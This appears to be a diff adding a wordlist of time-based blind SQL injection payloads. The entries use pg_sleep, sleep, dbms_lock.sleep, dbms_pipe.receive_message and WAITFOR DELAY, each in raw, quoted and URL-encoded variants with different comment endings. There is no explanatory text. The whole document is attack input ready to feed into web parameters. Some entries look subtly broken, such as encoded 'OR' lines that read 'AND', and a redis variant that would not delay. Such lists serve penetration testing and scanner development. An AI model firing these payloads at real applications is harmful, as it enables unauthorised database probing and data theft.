+%22%20OR%20dbms_lock.sleep%2825%29%20--
+'" OR dbms_lock.sleep(25) --'
+" redis.call("TIME")[25] --
+%22%20redis.call%28%22TIME%22%29%5B25%5D%20--
+%22+redis.call%28%22TIME%22%29%5B25%5D+--
+'" redis.call("TIME")[25] --'
+"+redis.call("TIME")[25]+--
+%22%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--
+'"+redis.call("TIME")[25]+--'
+ OR"+redis.call("TIME")[25]+--
+%20OR%22%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--
+' OR"+redis.call("TIME")[25]+--'
+ AND"+redis.call("TIME")[25]+--
+%20AND%22%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--
+' AND"+redis.call("TIME")[25]+--'
+ AND"AND redis.call("TIME")[25] --
+%20AND%22AND%20redis.call%28%22TIME%22%29%5B25%5D%20--
++AND%22AND+redis.call%28%22TIME%22%29%5B25%5D+--
+' AND"AND redis.call("TIME")[25] --'
+ OR"OR redis.call("TIME")[25] --
+%20OR%22OR%20redis.call%28%22TIME%22%29%5B25%5D%20--
++OR%22OR+redis.call%28%22TIME%22%29%5B25%5D+--
+' OR"OR redis.call("TIME")[25] --'
+" AND redis.call("TIME")[25]+--
+%22%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--
+'" AND redis.call("TIME")[25]+--'
+" OR redis.call("TIME")[25]+--
+%22%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--
+'" OR redis.call("TIME")[25]+--'
+" AND redis.call("TIME")[25] --
+%22%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20--
+'" AND redis.call("TIME")[25] --'
+" OR redis.call("TIME")[25] --
+%22%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20--
+'" OR redis.call("TIME")[25] --'
+" WAITFOR DELAY '00:00:25' --
+%22%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
+%22+WAITFOR+DELAY+%2700%3A00%3A25%27+--
+'" WAITFOR DELAY \'00:00:25\' --'
+"+WAITFOR DELAY '00:00:25'+--
+%22%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+'"+WAITFOR DELAY \'00:00:25\'+--'
+ OR"+WAITFOR DELAY '00:00:25'+--
+%20OR%22%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+' OR"+WAITFOR DELAY \'00:00:25\'+--'
+ AND"+WAITFOR DELAY '00:00:25'+--
+%20AND%22%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+' AND"+WAITFOR DELAY \'00:00:25\'+--'
+ AND"AND WAITFOR DELAY '00:00:25' --
+%20AND%22AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
++AND%22AND+WAITFOR+DELAY+%2700%3A00%3A25%27+--
+' AND"AND WAITFOR DELAY \'00:00:25\' --'
+ OR"OR WAITFOR DELAY '00:00:25' --
+%20OR%22OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
++OR%22OR+WAITFOR+DELAY+%2700%3A00%3A25%27+--
+' OR"OR WAITFOR DELAY \'00:00:25\' --'
+" AND WAITFOR DELAY '00:00:25'+--
+%22%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+'" AND WAITFOR DELAY \'00:00:25\'+--'
+" OR WAITFOR DELAY '00:00:25'+--
+%22%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+'" OR WAITFOR DELAY \'00:00:25\'+--'
+" AND WAITFOR DELAY '00:00:25' --
+%22%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
+'" AND WAITFOR DELAY \'00:00:25\' --'
+" OR WAITFOR DELAY '00:00:25' --
+%22%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
+'" OR WAITFOR DELAY \'00:00:25\' --'
+" pg_sleep(25) --+-
+%22%20pg_sleep%2825%29%20--%2B-
+%22+pg_sleep%2825%29+--%2B-
+'" pg_sleep(25) --+-'
+"+pg_sleep(25)+--+-
+%22%2Bpg_sleep%2825%29%2B--%2B-
+'"+pg_sleep(25)+--+-'
+ OR"+pg_sleep(25)+--+-
+%20OR%22%2Bpg_sleep%2825%29%2B--%2B-
+' OR"+pg_sleep(25)+--+-'
+ AND"+pg_sleep(25)+--+-
+%20AND%22%2Bpg_sleep%2825%29%2B--%2B-
+' AND"+pg_sleep(25)+--+-'
+ AND"AND pg_sleep(25) --+-
+%20AND%22AND%20pg_sleep%2825%29%20--%2B-
++AND%22AND+pg_sleep%2825%29+--%2B-
+' AND"AND pg_sleep(25) --+-'
+ OR"OR pg_sleep(25) --+-
+%20OR%22OR%20pg_sleep%2825%29%20--%2B-
++OR%22OR+pg_sleep%2825%29+--%2B-
+' OR"OR pg_sleep(25) --+-'
+" AND pg_sleep(25)+--+-
+%22%20AND%20pg_sleep%2825%29%2B--%2B-
+'" AND pg_sleep(25)+--+-'
+" OR pg_sleep(25)+--+-
+%22%20AND%20pg_sleep%2825%29%2B--%2B-
+'" OR pg_sleep(25)+--+-'
+" AND pg_sleep(25) --+-
+%22%20AND%20pg_sleep%2825%29%20--%2B-
+'" AND pg_sleep(25) --+-'
+" OR pg_sleep(25) --+-
+%22%20OR%20pg_sleep%2825%29%20--%2B-
+'" OR pg_sleep(25) --+-'
+" dbms_pipe.receive_message(('a'),25) --+-
+%22%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
+%22+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--%2B-
+'" dbms_pipe.receive_message((\'a\'),25) --+-'
+"+dbms_pipe.receive_message(('a'),25)+--+-
+%22%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+'"+dbms_pipe.receive_message((\'a\'),25)+--+-'
+ OR"+dbms_pipe.receive_message(('a'),25)+--+-
+%20OR%22%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+' OR"+dbms_pipe.receive_message((\'a\'),25)+--+-'
+ AND"+dbms_pipe.receive_message(('a'),25)+--+-
+%20AND%22%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+' AND"+dbms_pipe.receive_message((\'a\'),25)+--+-'
+ AND"AND dbms_pipe.receive_message(('a'),25) --+-
+%20AND%22AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
++AND%22AND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--%2B-
+' AND"AND dbms_pipe.receive_message((\'a\'),25) --+-'
+ OR"OR dbms_pipe.receive_message(('a'),25) --+-
+%20OR%22OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
++OR%22OR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--%2B-
+' OR"OR dbms_pipe.receive_message((\'a\'),25) --+-'
+" AND dbms_pipe.receive_message(('a'),25)+--+-
+%22%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+'" AND dbms_pipe.receive_message((\'a\'),25)+--+-'
+" OR dbms_pipe.receive_message(('a'),25)+--+-
+%22%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+'" OR dbms_pipe.receive_message((\'a\'),25)+--+-'
+" AND dbms_pipe.receive_message(('a'),25) --+-
+%22%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
+'" AND dbms_pipe.receive_message((\'a\'),25) --+-'
+" OR dbms_pipe.receive_message(('a'),25) --+-
+%22%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
+'" OR dbms_pipe.receive_message((\'a\'),25) --+-'
+" sleep(25) --+-
+%22%20sleep%2825%29%20--%2B-
+%22+sleep%2825%29+--%2B-
+'" sleep(25) --+-'
+"+sleep(25)+--+-
+%22%2Bsleep%2825%29%2B--%2B-
+'"+sleep(25)+--+-'
+ OR"+sleep(25)+--+-
+%20OR%22%2Bsleep%2825%29%2B--%2B-
+' OR"+sleep(25)+--+-'
+ AND"+sleep(25)+--+-
+%20AND%22%2Bsleep%2825%29%2B--%2B-
+' AND"+sleep(25)+--+-'
+ AND"AND sleep(25) --+-
+%20AND%22AND%20sleep%2825%29%20--%2B-
++AND%22AND+sleep%2825%29+--%2B-
+' AND"AND sleep(25) --+-'
+ OR"OR sleep(25) --+-
+%20OR%22OR%20sleep%2825%29%20--%2B-
++OR%22OR+sleep%2825%29+--%2B-
+' OR"OR sleep(25) --+-'
+" AND sleep(25)+--+-
+%22%20AND%20sleep%2825%29%2B--%2B-
+'" AND sleep(25)+--+-'
+" OR sleep(25)+--+-
+%22%20AND%20sleep%2825%29%2B--%2B-
+'" OR sleep(25)+--+-'
+" AND sleep(25) --+-
+%22%20AND%20sleep%2825%29%20--%2B-
+'" AND sleep(25) --+-'
+" OR sleep(25) --+-
+%22%20OR%20sleep%2825%29%20--%2B-
+'" OR sleep(25) --+-'
+" dbms_lock.sleep(25) --+-
+%22%20dbms_lock.sleep%2825%29%20--%2B-
+%22+dbms_lock.sleep%2825%29+--%2B-
+'" dbms_lock.sleep(25) --+-'
+"+dbms_lock.sleep(25)+--+-
+%22%2Bdbms_lock.sleep%2825%29%2B--%2B-
+'"+dbms_lock.sleep(25)+--+-'
+ OR"+dbms_lock.sleep(25)+--+-
+%20OR%22%2Bdbms_lock.sleep%2825%29%2B--%2B-
+' OR"+dbms_lock.sleep(25)+--+-'
+ AND"+dbms_lock.sleep(25)+--+-
+%20AND%22%2Bdbms_lock.sleep%2825%29%2B--%2B-
+' AND"+dbms_lock.sleep(25)+--+-'
+ AND"AND dbms_lock.sleep(25) --+-
+%20AND%22AND%20dbms_lock.sleep%2825%29%20--%2B-
++AND%22AND+dbms_lock.sleep%2825%29+--%2B-
+' AND"AND dbms_lock.sleep(25) --+-'
+ OR"OR dbms_lock.sleep(25) --+-
+%20OR%22OR%20dbms_lock.sleep%2825%29%20--%2B-
++OR%22OR+dbms_lock.sleep%2825%29+--%2B-
+' OR"OR dbms_lock.sleep(25) --+-'
+" AND dbms_lock.sleep(25)+--+-
+%22%20AND%20dbms_lock.sleep%2825%29%2B--%2B-
+'" AND dbms_lock.sleep(25)+--+-'
+" OR dbms_lock.sleep(25)+--+-
+%22%20AND%20dbms_lock.sleep%2825%29%2B--%2B-
+'" OR dbms_lock.sleep(25)+--+-'
+" AND dbms_lock.sleep(25) --+-
+%22%20AND%20dbms_lock.sleep%2825%29%20--%2B-
+'" AND dbms_lock.sleep(25) --+-'
+" OR dbms_lock.sleep(25) --+-
+%22%20OR%20dbms_lock.sleep%2825%29%20--%2B-
+'" OR dbms_lock.sleep(25) --+-'
+" redis.call("TIME")[25] --+-
+%22%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
+%22+redis.call%28%22TIME%22%29%5B25%5D+--%2B-
+'" redis.call("TIME")[25] --+-'
+"+redis.call("TIME")[25]+--+-
+%22%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+'"+redis.call("TIME")[25]+--+-'
+ OR"+redis.call("TIME")[25]+--+-
+%20OR%22%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+' OR"+redis.call("TIME")[25]+--+-'
+ AND"+redis.call("TIME")[25]+--+-
+%20AND%22%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+' AND"+redis.call("TIME")[25]+--+-'
+ AND"AND redis.call("TIME")[25] --+-
+%20AND%22AND%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
++AND%22AND+redis.call%28%22TIME%22%29%5B25%5D+--%2B-
+' AND"AND redis.call("TIME")[25] --+-'
+ OR"OR redis.call("TIME")[25] --+-
+%20OR%22OR%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
++OR%22OR+redis.call%28%22TIME%22%29%5B25%5D+--%2B-
+' OR"OR redis.call("TIME")[25] --+-'
+" AND redis.call("TIME")[25]+--+-
+%22%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+'" AND redis.call("TIME")[25]+--+-'
+" OR redis.call("TIME")[25]+--+-
+%22%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+'" OR redis.call("TIME")[25]+--+-'
+" AND redis.call("TIME")[25] --+-
+%22%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
+'" AND redis.call("TIME")[25] --+-'
+" OR redis.call("TIME")[25] --+-
+%22%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
+'" OR redis.call("TIME")[25] --+-'
+" WAITFOR DELAY '00:00:25' --+-
+%22%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
+%22+WAITFOR+DELAY+%2700%3A00%3A25%27+--%2B-
+'" WAITFOR DELAY \'00:00:25\' --+-'
+"+WAITFOR DELAY '00:00:25'+--+-
+%22%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+'"+WAITFOR DELAY \'00:00:25\'+--+-'
+ OR"+WAITFOR DELAY '00:00:25'+--+-
+%20OR%22%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+' OR"+WAITFOR DELAY \'00:00:25\'+--+-'
+ AND"+WAITFOR DELAY '00:00:25'+--+-
+%20AND%22%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+' AND"+WAITFOR DELAY \'00:00:25\'+--+-'
+ AND"AND WAITFOR DELAY '00:00:25' --+-
+%20AND%22AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
++AND%22AND+WAITFOR+DELAY+%2700%3A00%3A25%27+--%2B-
+' AND"AND WAITFOR DELAY \'00:00:25\' --+-'
+ OR"OR WAITFOR DELAY '00:00:25' --+-
+%20OR%22OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
++OR%22OR+WAITFOR+DELAY+%2700%3A00%3A25%27+--%2B-
+' OR"OR WAITFOR DELAY \'00:00:25\' --+-'
+" AND WAITFOR DELAY '00:00:25'+--+-
+%22%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+'" AND WAITFOR DELAY \'00:00:25\'+--+-'
+" OR WAITFOR DELAY '00:00:25'+--+-
+%22%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+'" OR WAITFOR DELAY \'00:00:25\'+--+-'
+" AND WAITFOR DELAY '00:00:25' --+-
+%22%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
+'" AND WAITFOR DELAY \'00:00:25\' --+-'
+" OR WAITFOR DELAY '00:00:25' --+-
+%22%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
+'" OR WAITFOR DELAY \'00:00:25\' --+-'
+" pg_sleep(25) #
+%22%20pg_sleep%2825%29%20%23
+%22+pg_sleep%2825%29+%23
+'" pg_sleep(25) #'
+"+pg_sleep(25)+#
+%22%2Bpg_sleep%2825%29%2B%23
+'"+pg_sleep(25)+#'
+ OR"+pg_sleep(25)+#
+%20OR%22%2Bpg_sleep%2825%29%2B%23
+' OR"+pg_sleep(25)+#'
+ AND"+pg_sleep(25)+#
+%20AND%22%2Bpg_sleep%2825%29%2B%23
+' AND"+pg_sleep(25)+#'
+ AND"AND pg_sleep(25) #
+%20AND%22AND%20pg_sleep%2825%29%20%23
++AND%22AND+pg_sleep%2825%29+%23
+' AND"AND pg_sleep(25) #'
+ OR"OR pg_sleep(25) #
+%20OR%22OR%20pg_sleep%2825%29%20%23
++OR%22OR+pg_sleep%2825%29+%23
+' OR"OR pg_sleep(25) #'
+" AND pg_sleep(25)+#
+%22%20AND%20pg_sleep%2825%29%2B%23
+'" AND pg_sleep(25)+#'
+" OR pg_sleep(25)+#
+%22%20AND%20pg_sleep%2825%29%2B%23
+'" OR pg_sleep(25)+#'
+" AND pg_sleep(25) #
+%22%20AND%20pg_sleep%2825%29%20%23
+'" AND pg_sleep(25) #'
+" OR pg_sleep(25) #
+%22%20OR%20pg_sleep%2825%29%20%23
+'" OR pg_sleep(25) #'
+" dbms_pipe.receive_message(('a'),25) #
+%22%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
+%22+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%23
+'" dbms_pipe.receive_message((\'a\'),25) #'
+"+dbms_pipe.receive_message(('a'),25)+#
+%22%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+'"+dbms_pipe.receive_message((\'a\'),25)+#'
+ OR"+dbms_pipe.receive_message(('a'),25)+#
+%20OR%22%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+' OR"+dbms_pipe.receive_message((\'a\'),25)+#'
+ AND"+dbms_pipe.receive_message(('a'),25)+#
+%20AND%22%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+' AND"+dbms_pipe.receive_message((\'a\'),25)+#'
+ AND"AND dbms_pipe.receive_message(('a'),25) #
+%20AND%22AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
++AND%22AND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%23
+' AND"AND dbms_pipe.receive_message((\'a\'),25) #'
+ OR"OR dbms_pipe.receive_message(('a'),25) #
+%20OR%22OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
++OR%22OR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%23
+' OR"OR dbms_pipe.receive_message((\'a\'),25) #'
+" AND dbms_pipe.receive_message(('a'),25)+#
+%22%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+'" AND dbms_pipe.receive_message((\'a\'),25)+#'
+" OR dbms_pipe.receive_message(('a'),25)+#
+%22%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+'" OR dbms_pipe.receive_message((\'a\'),25)+#'
+" AND dbms_pipe.receive_message(('a'),25) #
+%22%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
+'" AND dbms_pipe.receive_message((\'a\'),25) #'
+" OR dbms_pipe.receive_message(('a'),25) #
+%22%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
+'" OR dbms_pipe.receive_message((\'a\'),25) #'
+" sleep(25) #
+%22%20sleep%2825%29%20%23
+%22+sleep%2825%29+%23
+'" sleep(25) #'
+"+sleep(25)+#
+%22%2Bsleep%2825%29%2B%23
+'"+sleep(25)+#'
+ OR"+sleep(25)+#
+%20OR%22%2Bsleep%2825%29%2B%23
+' OR"+sleep(25)+#'
+ AND"+sleep(25)+#
+%20AND%22%2Bsleep%2825%29%2B%23
+' AND"+sleep(25)+#'
+ AND"AND sleep(25) #
+%20AND%22AND%20sleep%2825%29%20%23
++AND%22AND+sleep%2825%29+%23
+' AND"AND sleep(25) #'
+ OR"OR sleep(25) #
+%20OR%22OR%20sleep%2825%29%20%23
++OR%22OR+sleep%2825%29+%23
+' OR"OR sleep(25) #'
+" AND sleep(25)+#
+%22%20AND%20sleep%2825%29%2B%23
+'" AND sleep(25)+#'
+" OR sleep(25)+#
+%22%20AND%20sleep%2825%29%2B%23
+'" OR sleep(25)+#'
+" AND sleep(25) #
+%22%20AND%20sleep%2825%29%20%23
+'" AND sleep(25) #'
+" OR sleep(25) #
+%22%20OR%20sleep%2825%29%20%23
+'" OR sleep(25) #'
+" dbms_lock.sleep(25) #
+%22%20dbms_lock.sleep%2825%29%20%23
+%22+dbms_lock.sleep%2825%29+%23
+'" dbms_lock.sleep(25) #'
+"+dbms_lock.sleep(25)+#
+%22%2Bdbms_lock.sleep%2825%29%2B%23
+'"+dbms_lock.sleep(25)+#'
+ OR"+dbms_lock.sleep(25)+#
+%20OR%22%2Bdbms_lock.sleep%2825%29%2B%23
+' OR"+dbms_lock.sleep(25)+#'
+ AND"+dbms_lock.sleep(25)+#
+%20AND%22%2Bdbms_lock.sleep%2825%29%2B%23
+' AND"+dbms_lock.sleep(25)+#'
+ AND"AND dbms_lock.sleep(25) #
+%20AND%22AND%20dbms_lock.sleep%2825%29%20%23
++AND%22AND+dbms_lock.sleep%2825%29+%23
+' AND"AND dbms_lock.sleep(25) #'
+ OR"OR dbms_lock.sleep(25) #
+%20OR%22OR%20dbms_lock.sleep%2825%29%20%23
++OR%22OR+dbms_lock.sleep%2825%29+%23
+' OR"OR dbms_lock.sleep(25) #'
+" AND dbms_lock.sleep(25)+#
+%22%20AND%20dbms_lock.sleep%2825%29%2B%23
+'" AND dbms_lock.sleep(25)+#'
+" OR dbms_lock.sleep(25)+#
+%22%20AND%20dbms_lock.sleep%2825%29%2B%23
+'" OR dbms_lock.sleep(25)+#'
+" AND dbms_lock.sleep(25) #
+%22%20AND%20dbms_lock.sleep%2825%29%20%23
+'" AND dbms_lock.sleep(25) #'
+" OR dbms_lock.sleep(25) #
+%22%20OR%20dbms_lock.sleep%2825%29%20%23
+'" OR dbms_lock.sleep(25) #'
+" redis.call("TIME")[25] #
+%22%20redis.call%28%22TIME%22%29%5B25%5D%20%23
+%22+redis.call%28%22TIME%22%29%5B25%5D+%23
+'" redis.call("TIME")[25] #'
+"+redis.call("TIME")[25]+#
+%22%2Bredis.call%28%22TIME%22%29%5B25%5D%2B%23
+'"+redis.call("TIME")[25]+#'
+ OR"+redis.call("TIME")[25]+#
+%20OR%22%2Bredis.call%28%22TIME%22%29%5B25%5D%2B%23
+' OR"+redis.call("TIME")[25]+#'
+ AND"+redis.call("TIME")[25]+#
+%20AND%22%2Bredis.call%28%22TIME%22%29%5B25%5D%2B%23
+' AND"+redis.call("TIME")[25]+#'
+ AND"AND redis.call("TIME")[25] #
+%20AND%22AND%20redis.call%28%22TIME%22%29%5B25%5D%20%23
++AND%22AND+redis.call%28%22TIME%22%29%5B25%5D+%23
+' AND"AND redis.call("TIME")[25] #'
+ OR"OR redis.call("TIME")[25] #
+%20OR%22OR%20redis.call%28%22TIME%22%29%5B25%5D%20%23
++OR%22OR+redis.call%28%22TIME%22%29%5B25%5D+%23
+' OR"OR redis.call("TIME")[25] #'
+" AND redis.call("TIME")[25]+#
+%22%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B%23
+'" AND redis.call("TIME")[25]+#'
+" OR redis.call("TIME")[25]+#
+%22%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B%23
+'" OR redis.call("TIME")[25]+#'
+" AND redis.call("TIME")[25] #
+%22%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20%23
+'" AND redis.call("TIME")[25] #'
+" OR redis.call("TIME")[25] #
+%22%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20%23
+'" OR redis.call("TIME")[25] #'
+" WAITFOR DELAY '00:00:25' #
+%22%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
+%22+WAITFOR+DELAY+%2700%3A00%3A25%27+%23
+'" WAITFOR DELAY \'00:00:25\' #'
+"+WAITFOR DELAY '00:00:25'+#
+%22%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+'"+WAITFOR DELAY \'00:00:25\'+#'
+ OR"+WAITFOR DELAY '00:00:25'+#
+%20OR%22%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+' OR"+WAITFOR DELAY \'00:00:25\'+#'
+ AND"+WAITFOR DELAY '00:00:25'+#
+%20AND%22%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+' AND"+WAITFOR DELAY \'00:00:25\'+#'
+ AND"AND WAITFOR DELAY '00:00:25' #
+%20AND%22AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
++AND%22AND+WAITFOR+DELAY+%2700%3A00%3A25%27+%23
+' AND"AND WAITFOR DELAY \'00:00:25\' #'
+ OR"OR WAITFOR DELAY '00:00:25' #
+%20OR%22OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
++OR%22OR+WAITFOR+DELAY+%2700%3A00%3A25%27+%23
+' OR"OR WAITFOR DELAY \'00:00:25\' #'
+" AND WAITFOR DELAY '00:00:25'+#
+%22%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+'" AND WAITFOR DELAY \'00:00:25\'+#'
+" OR WAITFOR DELAY '00:00:25'+#
+%22%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+'" OR WAITFOR DELAY \'00:00:25\'+#'
+" AND WAITFOR DELAY '00:00:25' #
+%22%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
+'" AND WAITFOR DELAY \'00:00:25\' #'
+" OR WAITFOR DELAY '00:00:25' #
+%22%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
+'" OR WAITFOR DELAY \'00:00:25\' #'
+" pg_sleep(25) /**/
+%22%20pg_sleep%2825%29%20/%2A%2A/
+%22+pg_sleep%2825%29+%2F%2A%2A%2F
+'" pg_sleep(25) /**/'
+"+pg_sleep(25)+/**/
+%22%2Bpg_sleep%2825%29%2B/%2A%2A/
+'"+pg_sleep(25)+/**/'
+ OR"+pg_sleep(25)+/**/
+%20OR%22%2Bpg_sleep%2825%29%2B/%2A%2A/
+' OR"+pg_sleep(25)+/**/'
+ AND"+pg_sleep(25)+/**/
+%20AND%22%2Bpg_sleep%2825%29%2B/%2A%2A/
+' AND"+pg_sleep(25)+/**/'
+ AND"AND pg_sleep(25) /**/
+%20AND%22AND%20pg_sleep%2825%29%20/%2A%2A/
++AND%22AND+pg_sleep%2825%29+%2F%2A%2A%2F
+' AND"AND pg_sleep(25) /**/'
+ OR"OR pg_sleep(25) /**/
+%20OR%22OR%20pg_sleep%2825%29%20/%2A%2A/
++OR%22OR+pg_sleep%2825%29+%2F%2A%2A%2F
+' OR"OR pg_sleep(25) /**/'
+" AND pg_sleep(25)+/**/
+%22%20AND%20pg_sleep%2825%29%2B/%2A%2A/
+'" AND pg_sleep(25)+/**/'
+" OR pg_sleep(25)+/**/
+%22%20AND%20pg_sleep%2825%29%2B/%2A%2A/
+'" OR pg_sleep(25)+/**/'
+" AND pg_sleep(25) /**/
+%22%20AND%20pg_sleep%2825%29%20/%2A%2A/
+'" AND pg_sleep(25) /**/'
+" OR pg_sleep(25) /**/
+%22%20OR%20pg_sleep%2825%29%20/%2A%2A/
+'" OR pg_sleep(25) /**/'
+" dbms_pipe.receive_message(('a'),25) /**/
+%22%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
+%22+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%2F%2A%2A%2F
+'" dbms_pipe.receive_message((\'a\'),25) /**/'
+"+dbms_pipe.receive_message(('a'),25)+/**/
+%22%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+'"+dbms_pipe.receive_message((\'a\'),25)+/**/'
+ OR"+dbms_pipe.receive_message(('a'),25)+/**/
+%20OR%22%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+' OR"+dbms_pipe.receive_message((\'a\'),25)+/**/'
+ AND"+dbms_pipe.receive_message(('a'),25)+/**/
+%20AND%22%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+' AND"+dbms_pipe.receive_message((\'a\'),25)+/**/'
+ AND"AND dbms_pipe.receive_message(('a'),25) /**/
+%20AND%22AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
++AND%22AND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%2F%2A%2A%2F
+' AND"AND dbms_pipe.receive_message((\'a\'),25) /**/'
+ OR"OR dbms_pipe.receive_message(('a'),25) /**/
+%20OR%22OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
++OR%22OR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%2F%2A%2A%2F
+' OR"OR dbms_pipe.receive_message((\'a\'),25) /**/'
+" AND dbms_pipe.receive_message(('a'),25)+/**/
+%22%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+'" AND dbms_pipe.receive_message((\'a\'),25)+/**/'
+" OR dbms_pipe.receive_message(('a'),25)+/**/
+%22%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+'" OR dbms_pipe.receive_message((\'a\'),25)+/**/'
+" AND dbms_pipe.receive_message(('a'),25) /**/
+%22%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
+'" AND dbms_pipe.receive_message((\'a\'),25) /**/'
+" OR dbms_pipe.receive_message(('a'),25) /**/
+%22%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
+'" OR dbms_pipe.receive_message((\'a\'),25) /**/'
+" sleep(25) /**/
+%22%20sleep%2825%29%20/%2A%2A/
+%22+sleep%2825%29+%2F%2A%2A%2F
+'" sleep(25) /**/'
+"+sleep(25)+/**/
+%22%2Bsleep%2825%29%2B/%2A%2A/
+'"+sleep(25)+/**/'
+ OR"+sleep(25)+/**/
+%20OR%22%2Bsleep%2825%29%2B/%2A%2A/
+' OR"+sleep(25)+/**/'
+ AND"+sleep(25)+/**/
+%20AND%22%2Bsleep%2825%29%2B/%2A%2A/
+' AND"+sleep(25)+/**/'
+ AND"AND sleep(25) /**/
+%20AND%22AND%20sleep%2825%29%20/%2A%2A/
++AND%22AND+sleep%2825%29+%2F%2A%2A%2F
+' AND"AND sleep(25) /**/'
+ OR"OR sleep(25) /**/
+%20OR%22OR%20sleep%2825%29%20/%2A%2A/
++OR%22OR+sleep%2825%29+%2F%2A%2A%2F
+' OR"OR sleep(25) /**/'
+" AND sleep(25)+/**/
